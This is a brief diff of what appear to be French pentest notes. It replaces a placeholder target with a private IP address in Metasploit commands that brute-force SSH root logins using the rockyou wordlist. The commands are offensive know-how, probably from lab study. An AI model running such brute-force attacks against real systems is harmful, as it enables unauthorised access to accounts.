@@ -22,7 +22,7 @@ SSH bruteforce :
 ```bash
 msfconsole
 use auxiliary/scanner/ssh/ssh_login
-set RHOSTS <IP_cible>
+set RHOSTS 192.168.100.12
 set USERNAME root
 set PASSWORD /usr/share/wordlists/rockyou.txt
 run
